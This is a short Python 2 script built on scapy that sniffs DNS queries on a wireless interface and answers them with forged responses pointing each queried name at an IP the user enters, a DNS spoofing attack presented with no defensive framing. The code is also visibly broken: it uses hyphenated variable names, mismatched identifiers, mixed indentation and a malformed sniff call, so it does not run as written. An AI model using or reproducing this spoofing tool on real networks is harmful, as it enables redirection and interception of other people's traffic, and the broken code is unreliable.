#!/usr/bin/python

# Change log level to suppress annoying IPv6 error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

#Import Scapi library
from scapy.all import *

dns-server-ip-address = raw_input('Please enter the IP address of the DNS server :')

local-ip-address      = raw_input('Please enter the local IP address :') 

filter = "udp port 53 and ip dst " + dns-server-ip

def dns_spoof(pkt):

    if (pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[IP].src != localIP):
    	# the IP dest is the DNS server and the src is the client how made a DNS query to get the IP address of www.foo.com
    	ip    = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    	udp   = UDP(dport=pkt[UDP].sport, sport=53)
    	dns   = DNS(id=pkt[DNS].id, aa = 1, qr=1, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qd.qname, ttl=10, rdata=local-ip-address))

		spoofedResp = ip/udp/dns
		
		send(spoofedResp)

		print "Spoofed DNS response sent !"

sniff(iface="wlan0", store=0, prn=dns_spoof, filter=filter, lfilter=filter, lambda(f):f.haslayer(DNSQR))